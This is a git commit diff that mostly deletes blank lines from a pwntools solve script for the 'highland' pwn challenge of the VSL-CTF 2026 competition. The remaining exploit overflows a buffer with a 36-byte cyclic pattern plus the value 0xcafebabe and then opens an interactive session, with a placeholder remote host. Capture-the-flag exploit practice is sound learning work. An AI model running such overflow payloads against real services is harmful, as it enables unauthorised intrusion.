80bafc44cdf08c2ce9b2d307da8985df01c2d65c
Hoa Ly Van Huu (mthz72) <140467296+hoalvh@users.noreply.github.com>
2026-01-26 13:03:49 +0700

    Refactor connection handling and clean up code.
    Refactor connection handling and clean up code.

--- VSL-CTF 2026/PWN/highland/solve_highlands.py
+++ VSL-CTF 2026/PWN/highland/solve_highlands.py
@@ -9,8 +9,6 @@ context.terminal = ["cmd.exe", "/c", "start", "wsl.exe", "-e"]
 
 # libc = ELF("./libc.so.6", checksec=False)
 # ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
-
-
 def sla(delim, data): return p.sendlineafter(delim, data)
 def sa(delim, data):  return p.sendafter(delim, data)
 def sl(data):         return p.sendline(data)
@@ -19,33 +17,22 @@ def ru(delim):        return p.recvuntil(delim)
 def rl():             return p.recvline()
 def r(n):             return p.recv(n)
 
-
 gdbscript = '''
 init-pwndbg
 continue
 '''
-
 def conn():
-    
     if args.REMOTE:
         return remote("HOST_ADDRESS", 1337)
-    
     elif args.GDB:
         return gdb.debug([exe.path], gdbscript=gdbscript)
-    
     else:
-        
         # return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
-        
         return process([exe.path])
-
 p = conn()
-
 # --- Exploit ---
 
 # Payload 
 payload = cyclic(36) + p32(0xcafebabe)
-
 s(payload)
-
 p.interactive()
